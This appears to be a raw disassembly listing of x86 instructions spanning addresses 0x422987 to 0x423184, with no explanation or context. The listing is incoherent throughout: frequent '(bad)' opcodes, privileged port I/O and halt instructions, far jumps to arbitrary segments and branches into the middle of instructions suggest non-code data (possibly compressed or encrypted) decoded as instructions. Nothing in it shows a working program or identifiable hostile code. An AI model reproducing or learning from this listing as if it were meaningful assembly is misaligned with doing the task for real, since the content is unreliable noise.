  422987:	adc    BYTE PTR [esp+ecx*4-0x7fb3f578],dl
  42298e:	je     0x422987
  422990:	mov    ds:0xe4876ef4,al
  422995:	cld    
  422996:	loopne 0x42294b
  422998:	cmp    DWORD PTR [ebx-0x37],eax
  42299b:	out    0x47,eax
  42299d:	jae    0x4229cf
  42299f:	or     dh,BYTE PTR [ecx-0x5a]
  4229a2:	(bad)  
  4229a3:	mul    DWORD PTR ds:0x72effcfa
  4229a9:	popf   
  4229aa:	(bad)  
  4229ab:	gs push ebx
  4229ad:	push   0xd2340cdb
  4229b2:	mov    esp,eax
  4229b4:	and    DWORD PTR [ecx],edx
  4229b6:	aad    0x0
	...
  4229c0:	add    BYTE PTR [eax],al
  4229c2:	fist   WORD PTR [ebx-0x4e]
  4229c5:	dec    edi
  4229c6:	mov    esi,0x67d3ffef
  4229cb:	xchg   ecx,edi
  4229cd:	adc    al,0x18
  4229cf:	and    al,0xa1
  4229d1:	call   0x5d:0x1d0bc
  4229d8:	add    BYTE PTR [eax],al
  4229da:	fiadd  WORD PTR [ecx-0x21]
  4229dd:	mov    dh,0x41
  4229df:	add    ebx,eax
  4229e1:	int3   
  4229e2:	loope  0x4229a7
  4229e4:	mov    dl,0xa9
  4229e6:	mov    edi,0x9132da01
  4229eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229ec:	mov    ebx,0x943a4d85
  4229f1:	adc    ebp,DWORD PTR [edx+ebp*2-0x54]
  4229f5:	jne    0x422a18
  4229f7:	pop    esp
  4229f8:	dec    edi
  4229f9:	cmp    al,0x2e
  4229fb:	and    eax,DWORD PTR [ecx-0x1e]
  4229fe:	xor    DWORD PTR [esp+esi*1+0x59b264cf],edx
  422a05:	test   al,0xbd
  422a07:	leave  
  422a08:	not    BYTE PTR [edx]
  422a0a:	loopne 0x422a3d
  422a0c:	out    dx,eax
  422a0d:	std    
  422a0e:	pop    esp
  422a0f:	mov    edi,0x3d8e1b5a
  422a14:	shl    ecx,1
  422a16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422a17:	repnz or al,0x93
  422a1a:	add    al,0xab
  422a1c:	sub    eax,DWORD PTR [eax-0x57]
  422a1f:	dec    ebx
  422a20:	push   bx
  422a22:	dec    DWORD PTR [edx+ebp*2+0x34]
  422a26:	aaa    
  422a27:	nop
  422a28:	scas   al,BYTE PTR es:[edi]
  422a29:	int3   
  422a2a:	nop
  422a2b:	(bad)  [ebx]
  422a2d:	xchg   ecx,eax
  422a2e:	inc    edx
  422a2f:	mov    esi,0xd94dcc6e
  422a34:	adc    ecx,0xffffffe4
	...
  422a3f:	add    BYTE PTR [eax],al
  422a41:	add    BYTE PTR [edi-0x24252cf4],al
  422a47:	fisttp WORD PTR [edi+0x640ccb5d]
  422a4d:	push   ss
  422a4e:	jnp    0x422a26
  422a50:	outs   dx,BYTE PTR ds:[esi]
  422a51:	push   ds
  422a52:	sbb    ecx,edx
  422a54:	add    DWORD PTR [eax],eax
  422a56:	pop    ebp
  422a57:	add    BYTE PTR [eax],al
  422a59:	add    BYTE PTR [esi],al
  422a5b:	adc    eax,0x2614be33
  422a60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422a61:	test   al,0xdc
  422a63:	push   ebp
  422a64:	push   ebp
  422a65:	cli    
  422a66:	push   eax
  422a67:	adc    eax,0x4e27caae
  422a6c:	jmp    0x422a52
  422a6e:	fwait
  422a6f:	int    0x16
  422a71:	jmp    0x5215:0x56e2ec5e
  422a78:	test   eax,0xa649b0ad
  422a7d:	addr16 adc eax,0x54594508
  422a83:	bound  eax,QWORD PTR [edx]
  422a85:	std    
  422a86:	xor    ah,bh
  422a88:	push   ss
  422a89:	or     BYTE PTR [ecx-0x59],cl
  422a8c:	or     al,0x24
  422a8e:	dec    eax
  422a8f:	mov    ch,al
  422a91:	mov    ch,0xdf
  422a93:	adc    bh,BYTE PTR [edx+ebx*8]
  422a96:	xor    DWORD PTR [esi+esi*1+0x2cd403ca],eax
  422a9d:	jbe    0x422aeb
  422a9f:	rcr    BYTE PTR [ebx+0x73],1
  422aa2:	stos   DWORD PTR es:[edi],eax
  422aa3:	or     eax,0xf4b2b643
  422aa8:	je     0x422a2f
  422aaa:	push   esp
  422aab:	jecxz  0x422ac3
  422aad:	dec    ecx
  422aae:	mov    WORD PTR [ecx+0x7c],fs
  422ab1:	lods   eax,DWORD PTR ds:[esi]
  422ab2:	mov    ds:0xfb46c077,al
	...
  422abf:	add    BYTE PTR [eax],al
  422ac1:	add    BYTE PTR [edi-0x28db29d],bl
  422ac7:	jle    0x422a88
  422ac9:	out    dx,eax
  422aca:	sbb    edi,esp
  422acc:	mov    BYTE PTR [ecx+esi*4+0x76303ea8],dh
  422ad3:	rol    DWORD PTR [ecx],1
  422ad5:	add    BYTE PTR [ebp+0x0],bl
  422ad8:	add    BYTE PTR [eax],al
  422ada:	cmp    al,0x3f
  422adc:	inc    edi
  422add:	xlat   BYTE PTR ds:[ebx]
  422ade:	jbe    0x422ab4
  422ae0:	sar    BYTE PTR [edx+0x4],0x14
  422ae4:	sbb    eax,0xfe50cccd
  422ae9:	shl    BYTE PTR ds:0x370a5bcc,cl
  422aef:	rcl    cl,cl
  422af1:	lods   al,BYTE PTR ds:[esi]
  422af2:	push   esi
  422af3:	push   cs
  422af4:	pop    edi
  422af5:	jmp    0x422b6e
  422af7:	xor    DWORD PTR [ebx],0x1
  422afa:	mov    ecx,0xbb2ffd23
  422aff:	inc    ebx
  422b00:	sub    eax,0xa6bdeaf7
  422b05:	je     0x422acf
  422b07:	or     al,0x2e
  422b09:	bound  ebp,QWORD PTR [ebp-0x706b4ac2]
  422b0f:	sbb    edi,eax
  422b11:	imul   edi,DWORD PTR [eax],0xf8fcb32b
  422b17:	pop    es
  422b18:	shr    DWORD PTR [edx],cl
  422b1a:	sub    bh,al
  422b1c:	scas   al,BYTE PTR es:[edi]
  422b1d:	mov    dl,0x10
  422b1f:	jo     0x422aac
  422b21:	or     DWORD PTR [ebx-0x67671883],edi
  422b27:	mov    ah,0xa3
  422b29:	jbe    0x422ab9
  422b2b:	mov    esp,0x80b9cf24
  422b30:	dec    ebx
  422b31:	xchg   edi,eax
  422b32:	jae    0x422b7c
  422b34:	inc    edi
  422b35:	or     al,0xd9
	...
  422b3f:	add    BYTE PTR [eax],al
  422b41:	add    BYTE PTR [eax+0x23],dh
  422b44:	and    eax,0x7c6f7769
  422b49:	cmp    esp,DWORD PTR [eax+0x45bcee1c]
  422b4f:	stc    
  422b50:	jge    0x422b82
  422b52:	rcl    ecx,cl
  422b54:	add    DWORD PTR [eax],eax
  422b56:	pop    ebp
  422b57:	add    BYTE PTR [eax],al
  422b59:	add    BYTE PTR [ecx+0x32],dl
  422b5c:	test   al,0x75
  422b5e:	lock inc ebp
  422b60:	mov    esi,0x8cb68182
  422b65:	fsub   DWORD PTR [esi]
  422b67:	(bad)  
  422b68:	and    DWORD PTR [ebp-0x63],edi
  422b6b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422b6c:	xor    DWORD PTR [ebx-0x36b8a74a],esp
  422b72:	push   edi
  422b73:	xchg   BYTE PTR [ecx+0x7c],bh
  422b76:	inc    ecx
  422b77:	inc    edx
  422b78:	loop   0x422b40
  422b7a:	add    bh,al
  422b7c:	push   0xffffffee
  422b7e:	mov    esp,0x6b5aa176
  422b83:	gs popa 
  422b85:	aad    0x58
  422b87:	and    DWORD PTR es:[ebx+ebx*1],0x1
  422b8c:	jle    0x422b58
  422b8e:	popf   
  422b8f:	pop    ecx
  422b90:	adc    DWORD PTR [ebp-0x13e7621c],eax
  422b96:	mov    al,0x64
  422b98:	mov    cl,0x13
  422b9a:	inc    esp
  422b9b:	add    al,0xe1
  422b9d:	scas   eax,DWORD PTR es:[edi]
  422b9e:	adc    BYTE PTR [esi-0x3800c5a5],ch
  422ba4:	add    DWORD PTR [edx],eax
  422ba6:	push   ss
  422ba7:	xchg   ecx,eax
  422ba8:	xor    eax,0xaf40cbdc
  422bad:	fstp   st(1)
  422baf:	xor    esi,DWORD PTR [eax-0x10]
  422bb2:	add    esp,DWORD PTR [edi+0xc4b272]
	...
  422bc0:	add    BYTE PTR [eax],al
  422bc2:	xchg   esp,eax
  422bc3:	nop
  422bc4:	ffree  st(0)
  422bc6:	(bad)  
  422bc8:	popf   
  422bc9:	aam    0x57
  422bcb:	(bad)
  422bcf:	cmp    ecx,0x5b
  422bd2:	xor    dl,dl
  422bd4:	add    DWORD PTR [eax],eax
  422bd6:	pop    ebp
  422bd7:	add    BYTE PTR [eax],al
  422bd9:	add    BYTE PTR [ecx+0x98f30bd],dh
  422bdf:	push   0xffffffe3
  422be1:	lods   al,BYTE PTR ds:[esi]
  422be2:	test   eax,0x5e3d3993
  422be7:	imul   esi,DWORD PTR [edx-0x3fdb1a12],0xcdeb7671
  422bf1:	jecxz  0x422c48
  422bf3:	(bad)  
  422bf4:	into   
  422bf5:	scas   al,BYTE PTR es:[edi]
  422bf6:	cld    
  422bf7:	jb     0x422bf6
  422bf9:	test   BYTE PTR ds:0x1bdbdda5,al
  422bff:	xchg   ebx,eax
  422c00:	bound  esi,QWORD PTR [esi-0x20234639]
  422c06:	popf   
  422c07:	xor    eax,0xcc2e6413
  422c0c:	adc    DWORD PTR ds:0x3f3644c8,edi
  422c12:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c13:	lds    ebx,FWORD PTR [edx]
  422c15:	(bad)  
  422c16:	leave  
  422c17:	sbb    BYTE PTR [eax+0x0],0xc6
  422c1b:	cmc    
  422c1c:	mov    edi,edx
  422c1e:	and    BYTE PTR [esi],0x95
  422c21:	mov    edx,0xc7572025
  422c26:	std    
  422c27:	jnp    0x422be1
  422c29:	je     0x422bf2
  422c2b:	fs fwait
  422c2d:	push   ebp
  422c2e:	call   0xe42df052
  422c33:	pop    eax
  422c34:	sub    BYTE PTR [edi+0x9a],0x0
  422c3b:	add    BYTE PTR [eax],al
  422c3d:	add    BYTE PTR [eax],al
  422c3f:	add    BYTE PTR [eax],al
  422c41:	add    ah,dh
  422c43:	mov    dl,0x32
  422c45:	(bad)  
  422c46:	jbe    0x422c1e
  422c48:	hlt    
  422c49:	mov    dl,0xb1
  422c4b:	and    al,0xfe
  422c4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c4e:	pop    esp
  422c4f:	mov    ecx,0xd28dbc6d
  422c54:	add    DWORD PTR [eax],eax
  422c56:	pop    ebp
  422c57:	add    BYTE PTR [eax],al
  422c59:	add    BYTE PTR [ebx+eiz*8-0x78],dl
  422c5d:	jmp    0x90a8dd82
  422c62:	or     eax,0x24aa11ee
  422c67:	in     al,dx
  422c68:	out    dx,al
  422c69:	(bad)  
  422c6b:	add    al,0xf6
  422c6d:	jl     0x422c57
  422c6f:	aas    
  422c70:	push   es
  422c71:	(bad)  [ebp+0xc]
  422c74:	(bad)  
  422c75:	push   esi
  422c76:	fbstp  TBYTE PTR [eax]
  422c78:	jmp    0x422cd6
  422c7a:	mov    esp,esp
  422c7c:	mov    al,ds:0xd117123c
  422c81:	test   eax,0x11ddc9d1
  422c86:	es or  al,0x17
  422c8a:	loop   0x422cfc
  422c8c:	mov    eax,ds:0x70840887
  422c91:	arpl   WORD PTR [ebx-0x3771feca],dx
  422c97:	cwde   
  422c98:	addr16 mov eax,0xa2702763
  422c9e:	and    edi,DWORD PTR ds:0x7c1d52c6
  422ca4:	in     al,0x43
  422ca6:	mov    edx,0x53c0a54f
  422cab:	test   al,0xc
  422cad:	add    DWORD PTR [ecx],ecx
  422caf:	rcr    dh,0x86
  422cb2:	call   0x0:0x5849f121
	...
  422cc1:	add    BYTE PTR [edx],dh
  422cc3:	ror    esi,cl
  422cc5:	mov    ds:0xd37ebfef,al
  422cca:	sub    edi,DWORD PTR [esi]
  422ccc:	out    0x3f,eax
  422cce:	cdq    
  422ccf:	into   
  422cd0:	push   eax
  422cd1:	sub    al,0xea
  422cd3:	rol    BYTE PTR [ecx],cl
  422cd5:	add    BYTE PTR [ebp+0x0],bl
  422cd8:	add    BYTE PTR [eax],al
  422cda:	adc    esp,DWORD PTR [ecx+0x564a398f]
  422ce0:	(bad)  
  422ce1:	and    DWORD PTR [eax+ebx*8-0xb8c023a],ecx
  422ce8:	mov    WORD PTR [edx],gs
  422cea:	mul    ebx
  422cec:	push   edi
  422ced:	in     eax,0x9a
  422cef:	inc    eax
  422cf0:	leave  
  422cf1:	repz call 0x6845:0xbd0a6161
  422cf9:	les    esi,FWORD PTR [ebp+0x18e1294a]
  422cff:	adc    ch,dl
  422d01:	rcl    DWORD PTR [esi-0x32],1
  422d04:	int3   
  422d05:	and    DWORD PTR [edi],edx
  422d07:	sub    DWORD PTR [ebx-0x67f54f13],0x40
  422d0e:	xor    al,BYTE PTR [edx-0x76abd29d]
  422d14:	ins    DWORD PTR es:[edi],dx
  422d15:	hlt    
  422d16:	rcr    DWORD PTR [edi+0x59],0x3e
  422d1a:	adc    DWORD PTR [edx+0x646f72ba],ebp
  422d20:	xchg   BYTE PTR [esp+edx*2-0x76],dl
  422d24:	push   esp
  422d25:	xor    BYTE PTR [ebx+esi*4+0x36],dh
  422d29:	pop    ecx
  422d2a:	mov    esp,ebp
  422d2c:	retf   
  422d2d:	dec    edi
  422d2e:	pop    edx
  422d2f:	sar    ecx,1
  422d31:	mov    ch,0xfa
  422d33:	mov    ch,0xfa
  422d35:	adc    DWORD PTR [ebx+0x0],ebx
	...
  422d40:	add    BYTE PTR [eax],al
  422d42:	fucomi st,st(5)
  422d44:	outs   dx,BYTE PTR ds:[esi]
  422d45:	and    bh,BYTE PTR [esi-0x5d]
  422d48:	(bad)  
  422d4a:	pop    esi
  422d4b:	(bad)  
  422d4c:	mov    DWORD PTR [ebp-0x7392afb5],ecx
  422d52:	inc    edi
  422d53:	rol    DWORD PTR [ecx],cl
  422d55:	add    BYTE PTR [ebp+0x0],bl
  422d58:	add    BYTE PTR [eax],al
  422d5a:	add    BYTE PTR [edi+0x3c],dl
  422d5d:	out    0x4e,al
  422d5f:	mov    ch,0x22
  422d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422d62:	lods   al,BYTE PTR ds:[esi]
  422d63:	mov    bh,0x68
  422d65:	mov    bh,BYTE PTR [edx+0x75]
  422d68:	outs   dx,BYTE PTR ds:[esi]
  422d69:	scas   eax,DWORD PTR es:[edi]
  422d6a:	jb     0x422de0
  422d6c:	fdivr  QWORD PTR [ebp-0x61]
  422d6f:	cwde   
  422d70:	les    ebp,FWORD PTR [eax+0x30e99e4d]
  422d76:	ss xchg ecx,edx
  422d79:	cmp    edx,DWORD PTR [ebx+ebp*8-0x1f8c0d1d]
  422d80:	xchg   edx,eax
  422d81:	lods   eax,DWORD PTR ds:[esi]
  422d82:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d83:	repnz retf 
  422d85:	js     0x422d69
  422d87:	or     al,0x30
  422d89:	pop    ecx
  422d8a:	dec    DWORD PTR [eax+edx*4-0x78c423d4]
  422d91:	xor    dl,cl
  422d93:	fist   DWORD PTR [esi+0x42]
  422d96:	cdq    
  422d97:	dec    edi
  422d98:	js     0x422d42
  422d9a:	mov    esi,0x43419224
  422d9f:	jecxz  0x422de5
  422da1:	(bad)  
  422da3:	in     eax,0xa2
  422da5:	(bad)  [ebx-0x3b]
  422da8:	xlat   BYTE PTR ds:[ebx]
  422da9:	sub    edi,edx
  422dab:	add    edi,DWORD PTR [eax-0x71df355d]
  422db1:	pop    ebx
  422db2:	cmp    eax,0xd370a73c
	...
  422dbf:	add    BYTE PTR [eax],al
  422dc1:	add    BYTE PTR ds:0x6f976b22,al
  422dc7:	(bad)  
  422dc9:	mov    dl,0x66
  422dcb:	and    BYTE PTR [esi-0x727b1496],ah
  422dd1:	iret   
  422dd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dd3:	rol    DWORD PTR [ecx],cl
  422dd5:	add    BYTE PTR [ebp+0x0],bl
  422dd8:	add    BYTE PTR [eax],al
  422dda:	pusha  
  422ddb:	idiv   BYTE PTR [edx-0x7d]
  422dde:	aas    
  422ddf:	gs jnp 0x422d7d
  422de2:	pop    edi
  422de3:	sahf   
  422de4:	sbb    ebx,edx
  422de6:	ins    DWORD PTR es:[edi],dx
  422de7:	xlat   BYTE PTR ds:[ebx]
  422de8:	sub    al,0x24
  422dea:	pop    es
  422deb:	mov    bl,0x95
  422ded:	sbb    BYTE PTR [eax+0xf1099fd],bh
  422df3:	mov    ah,0x7c
  422df5:	push   0x31
  422df7:	out    0x5e,eax
  422df9:	iret   
  422dfa:	jb     0x422e68
  422dfc:	jne    0x422e70
  422dfe:	mov    dl,0x94
  422e00:	int3   
  422e01:	js     0x422e35
  422e03:	sbb    al,0x55
  422e05:	and    al,0xff
  422e07:	sub    eax,0x859de208
  422e0c:	ss mov dh,0x8a
  422e0f:	adc    BYTE PTR ds:0x2c2f4f04,cl
  422e15:	mov    dl,0x74
  422e17:	mov    cs,WORD PTR [edx-0x11b080a7]
  422e1d:	icebp  
  422e1e:	pop    ebp
  422e1f:	xor    BYTE PTR [esi+0x52],bl
  422e22:	and    DWORD PTR [ebp-0x1],esp
  422e25:	jle    0x422e16
  422e27:	shl    cl,cl
  422e29:	(bad)  
  422e2d:	and    eax,0x5befe384
  422e32:	rcr    DWORD PTR [eax+0xd286c7],cl
	...
  422e40:	add    BYTE PTR [eax],al
  422e42:	mov    edx,esp
  422e44:	and    al,0xd9
  422e46:	jg     0x422e41
  422e48:	call   esi
  422e4a:	into   
  422e4b:	inc    ebp
  422e4c:	mov    bh,0x11
  422e4e:	jo     0x422dff
  422e50:	rcr    BYTE PTR [ebp+0x1d401],cl
  422e56:	pop    ebp
  422e57:	add    BYTE PTR [eax],al
  422e59:	add    bh,ah
  422e5b:	pop    ecx
  422e5c:	imul   ebp,DWORD PTR [ecx+0x32f87e09],0xfffffff0
  422e63:	mov    ds:0x924b6139,al
  422e68:	aam    0x95
  422e6a:	ja     0x422ded
  422e6c:	dec    ebp
  422e6d:	fidivr WORD PTR [ebx+0x1a6c93e6]
  422e73:	daa    
  422e74:	jl     0x422e5c
  422e76:	fwait
  422e77:	pop    ebp
  422e78:	inc    eax
  422e79:	jmp    0x422edf
  422e7b:	push   ebx
  422e7c:	test   eax,0xc8d4d436
  422e81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422e82:	sahf   
  422e83:	cli    
  422e84:	loopne 0x422ee9
  422e86:	pop    ss
  422e87:	inc    edi
  422e88:	fidivr WORD PTR ds:0x72ee398f
  422e8e:	sbb    edi,DWORD PTR [ecx]
  422e90:	push   0x21
  422e92:	cdq    
  422e93:	sti    
  422e94:	sbb    al,0x1b
  422e96:	xchg   esi,eax
  422e97:	fidivr DWORD PTR [ecx-0x6b]
  422e9a:	cdq    
  422e9b:	fwait
  422e9c:	loop   0x422f12
  422e9e:	loop   0x422e44
  422ea0:	(bad)  
  422ea1:	xchg   ebx,eax
  422ea2:	jns    0x422e78
  422ea4:	das    
  422ea5:	ins    BYTE PTR es:[edi],dx
  422ea6:	cwde   
  422ea7:	retf   
  422ea8:	(bad)  
  422ea9:	mov    eax,DWORD PTR [eax]
  422eab:	dec    esi
  422eac:	das    
  422ead:	xchg   esp,eax
  422eae:	or     esp,DWORD PTR [ebp+0x77]
  422eb1:	jle    0x422f14
  422eb3:	jbe    0x422e7e
  422eb5:	push   0xffffffe1
	...
  422ebf:	add    BYTE PTR [eax],al
  422ec1:	add    dh,bl
  422ec3:	sub    DWORD PTR [eax-0x210c002e],ebx
  422ec9:	sub    eax,0x4af35f6
  422ece:	cli    
  422ecf:	adc    eax,DWORD PTR [ecx+0x1d45e21]
  422ed5:	add    BYTE PTR [ebp+0x0],bl
  422ed8:	add    BYTE PTR [eax],al
  422eda:	lds    esp,FWORD PTR [edx+edi*4+0x21]
  422ede:	mov    al,0x5a
  422ee0:	(bad)  
  422ee1:	mov    eax,ds:0x16d4d0f0
  422ee6:	pop    esp
  422ee7:	mov    edx,0x1d1f78a
  422eec:	je     0x422e72
  422eee:	(bad)  
  422eef:	lods   eax,DWORD PTR ds:[esi]
  422ef0:	data16 and BYTE PTR [edi],0x34
  422ef4:	in     eax,0x4
  422ef6:	mov    esi,0x4ed391c9
  422efb:	sub    BYTE PTR [eax+0x6],cl
  422efe:	inc    esp
  422eff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f00:	mov    ebp,0xae8b134b
  422f05:	(bad)  
  422f07:	mov    es,WORD PTR [ebx]
  422f09:	hlt    
  422f0a:	(bad)  
  422f0b:	jge    0x422f81
  422f0d:	jmp    0xca70:0x160a58cc
  422f14:	sub    ch,BYTE PTR [edi-0x27ba5a0d]
  422f1a:	out    dx,eax
  422f1b:	bound  ebp,QWORD PTR [eax+0x44]
  422f1e:	mov    WORD PTR [ecx],?
  422f20:	out    dx,al
  422f21:	push   cs
  422f22:	push   eax
  422f23:	jbe    0x422f8a
  422f25:	pop    edi
  422f26:	xchg   ah,ah
  422f28:	cdq    
  422f29:	aas    
  422f2a:	stos   DWORD PTR es:[edi],eax
  422f2b:	les    eax,FWORD PTR [edi+0x5d5f0423]
  422f31:	sbb    al,0xcd
  422f33:	mov    esi,0xef30f3
	...
  422f40:	add    BYTE PTR [eax],al
  422f42:	dec    esi
  422f43:	aas    
  422f44:	int3   
  422f45:	sbb    eax,0x7fdffffd
  422f4a:	out    dx,eax
  422f4b:	loopne 0x422f63
  422f4d:	lods   al,BYTE PTR ds:[esi]
  422f4e:	sahf   
  422f4f:	mov    ecx,0xd4bbe508
  422f54:	add    DWORD PTR [eax],eax
  422f56:	pop    ebp
  422f57:	add    BYTE PTR [eax],al
  422f59:	add    BYTE PTR [eax],bl
  422f5b:	mov    ecx,0x8dc599bd
  422f60:	fild   WORD PTR [ebp-0x78acdb77]
  422f66:	xlat   BYTE PTR ds:[ebx]
  422f67:	mov    esi,0x4b1d7d92
  422f6c:	punpckldq mm3,DWORD PTR [esi+0x1282c03b]
  422f73:	enter  0xa1c7,0x56
  422f77:	push   edi
  422f78:	fstp   DWORD PTR [esp+ebx*4]
  422f7b:	aas    
  422f7c:	int    0xad
  422f7e:	push   edi
  422f7f:	int3   
  422f80:	mov    ebx,0x278935d9
  422f85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f86:	test   BYTE PTR [eax+0x15c9db20],ch
  422f8c:	or     eax,0x83a71ebf
  422f91:	sub    ecx,DWORD PTR [edx-0x36]
  422f94:	jne    0x422f6e
  422f96:	xchg   esi,eax
  422f97:	lahf   
  422f98:	mov    edx,0x56583ef9
  422f9d:	and    eax,0xf06af94a
  422fa2:	ret    
  422fa3:	leave  
  422fa4:	or     al,0x85
  422fa6:	bswap  ebp
  422fa8:	out    0xe3,al
  422faa:	mov    eax,DWORD PTR [edx+0x1c75c9d2]
  422fb0:	lods   al,BYTE PTR ds:[esi]
  422fb1:	mov    esi,esi
  422fb3:	call   DWORD PTR [ecx]
  422fb5:	pop    eax
  422fb6:	into   
	...
  422fbf:	add    BYTE PTR [eax],al
  422fc1:	add    BYTE PTR [esi],bl
  422fc3:	test   eax,0x7ff735f6
  422fc8:	fild   QWORD PTR [ebx-0x5f9ed871]
  422fce:	push   ebp
  422fcf:	inc    esp
  422fd0:	sub    al,0x5c
  422fd2:	sbb    ch,dl
  422fd4:	add    DWORD PTR [eax],eax
  422fd6:	pop    ebp
  422fd7:	add    BYTE PTR [eax],al
  422fd9:	add    BYTE PTR [ecx],dl
  422fdb:	and    esi,esi
  422fdd:	push   ds
  422fde:	lds    esi,FWORD PTR [edi-0x2d1108a2]
  422fe4:	mov    WORD PTR [esi+0x3c8df1a6],ds
  422fea:	pushf  
  422feb:	sti    
  422fec:	retf   0xdc06
  422fef:	xor    al,0x6c
  422ff1:	lds    edi,FWORD PTR [edx+0x44]
  422ff4:	out    0xe4,al
  422ff6:	pop    ss
  422ff7:	xchg   ebx,eax
  422ff8:	pop    esp
  422ff9:	jmp    DWORD PTR [ebx-0xa83333e]
  422fff:	lahf   
  423000:	ins    BYTE PTR es:[edi],dx
  423001:	aas    
  423002:	pop    ds
  423003:	cmp    eax,0x43cfc5e6
  423008:	lds    ebp,FWORD PTR [ebp-0x461c81c3]
  42300e:	sub    al,0x2f
  423010:	mov    edi,0xa866798
  423015:	enter  0x830e,0x74
  423019:	cdq    
  42301a:	mov    edi,0x78229b47
  42301f:	ins    DWORD PTR es:[edi],dx
  423020:	loopne 0x422fa3
  423022:	in     al,0x18
  423024:	int3   
  423025:	xchg   ebp,eax
  423026:	aas    
  423027:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423028:	les    ebx,FWORD PTR [edi]
  42302a:	pop    ds
  42302b:	ficomp DWORD PTR [esi]
  42302d:	mov    ah,0xd4
  42302f:	mov    al,0xee
  423031:	les    edi,FWORD PTR [ebx+ecx*2+0x8ff58d]
	...
  423040:	add    BYTE PTR [eax],al
  423042:	fwait
  423043:	loope  0x4230b2
  423045:	sub    eax,0xf7dbad7f
  42304a:	sar    BYTE PTR [ebx],cl
  42304c:	(bad)  
  42304d:	add    BYTE PTR [ebx+0x75e6e191],ch
  423053:	aad    0x1
  423055:	add    BYTE PTR [ebp+0x0],bl
  423058:	add    BYTE PTR [eax],al
  42305a:	mov    ecx,0x2df0cdbe
  42305f:	and    DWORD PTR [ebx],eax
  423061:	adc    ebx,esp
  423063:	and    al,0xc1
  423065:	cmp    eax,0xea9d285f
  42306a:	lock mov cl,0xe2
  42306d:	push   es
  42306e:	shr    DWORD PTR [edi+esi*4],0xfb
  423072:	pop    esp
  423073:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423074:	or     BYTE PTR [ebx-0x4f33d618],bh
  42307a:	mov    BYTE PTR [eax-0x68],dh
  42307d:	sub    cl,BYTE PTR [edi+0x9]
  423080:	or     BYTE PTR [eax+0x76],al
  423083:	cli    
  423084:	or     al,0x2f
  423086:	mov    esi,DWORD PTR [ecx]
  423088:	inc    ebp
  423089:	mov    bl,0x59
  42308b:	pop    ss
  42308c:	inc    esp
  42308d:	adc    BYTE PTR [esi],ch
  42308f:	xchg   esp,eax
  423090:	xchg   esi,eax
  423091:	mov    esp,0x48aaa13b
  423096:	push   edi
  423097:	enter  0x9ee9,0xe8
  42309b:	jmp    0x4230fb
  42309d:	or     ebx,DWORD PTR [ecx]
  42309f:	cmp    esp,esi
  4230a1:	loopne 0x42309d
  4230a3:	out    dx,al
  4230a4:	mov    edx,0xf0ea51af
  4230a9:	int3   
  4230aa:	push   eax
  4230ab:	mov    fs,WORD PTR [ecx-0x36]
  4230ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4230af:	cwde   
  4230b0:	jmp    FWORD PTR [ebp-0x60]
  4230b3:	rcl    BYTE PTR [eax+ecx*1],1
  4230b6:	fiadd  WORD PTR [eax]
	...
  4230c0:	add    BYTE PTR [eax],al
  4230c2:	or     bh,dh
  4230c4:	ja     0x423110
  4230c6:	dec    edx
  4230c8:	cmp    eax,0x2e8eedf7
  4230cd:	dec    eax
  4230ce:	adc    esi,ebx
  4230d0:	xlat   BYTE PTR ds:[ebx]
  4230d1:	icebp  
  4230d2:	rcl    ch,cl
  4230d4:	add    DWORD PTR [eax],eax
  4230d6:	pop    ebp
  4230d7:	add    BYTE PTR [eax],al
  4230d9:	add    BYTE PTR [ecx+eax*1-0x4b034f6a],ch
  4230e0:	call   0xdf27cd55
  4230e5:	add    ch,BYTE PTR fs:[ebx-0x64]
  4230e9:	pop    ecx
  4230ea:	mov    ds:0xdc7f460d,eax
  4230ef:	add    eax,DWORD PTR [esi-0x1c925774]
  4230f5:	ret    
  4230f6:	or     al,0xaf
  4230f8:	push   ds
  4230f9:	mov    edx,esp
  4230fb:	jns    0x4230c8
  4230fd:	mov    eax,ds:0x120652ba
  423102:	mov    ecx,ebx
  423104:	sti    
  423105:	idiv   BYTE PTR [edx+esi*8]
  423108:	push   edi
  423109:	jno    0x42317e
  42310b:	pop    ss
  42310c:	dec    ebp
  42310d:	test   eax,0x274a1d27
  423112:	dec    edi
  423113:	xchg   esi,eax
  423114:	sar    BYTE PTR [edi-0x17],0xa7
  423118:	out    0xa7,al
  42311a:	sbb    eax,DWORD PTR [edx]
  42311c:	sbb    DWORD PTR ds:0xc4af8bcd,0x750738b9
  423126:	sub    edi,DWORD PTR [eax+esi*2-0x39]
  42312a:	push   edi
  42312b:	mov    ss,WORD PTR [ebx+0x79b21f63]
  423131:	fnstsw WORD PTR [edx]
  423133:	call   0xbdcd6e
	...
  423140:	add    BYTE PTR [eax],al
  423142:	arpl   WORD PTR ss:[eax-0x10],bp
  423146:	jge    0x423143
  423148:	mov    esi,0x8c7853e7
  42314d:	daa    
  42314e:	jns    0x42313b
  423150:	push   ss
  423151:	das    
  423152:	das    
  423153:	(bad)  
  423154:	add    DWORD PTR [eax],eax
  423156:	pop    ebp
  423157:	add    BYTE PTR [eax],al
  423159:	add    bh,ch
  42315b:	push   eax
  42315c:	pop    esp
  42315d:	test   edx,ebx
  42315f:	loopne 0x4231da
  423161:	(bad)  
  423162:	cmp    DWORD PTR [esi-0x6f],ecx
  423165:	fcomip st,st(1)
  423167:	push   cs
  423168:	int    0x3
  42316a:	and    al,0x5b
  42316c:	out    dx,eax
  42316d:	mov    ecx,0x7e3b3754
  423172:	dec    ebx
  423173:	test   eax,0x849d8183
  423178:	jb     0x423157
  42317a:	lahf   
  42317b:	push   esi
  42317c:	sar    BYTE PTR [ebx-0x76],1
  42317f:	cld    
  423180:	inc    esp
  423181:	or     al,0x21
  423183:	pop    ebp
  423184:	ds pop ebp
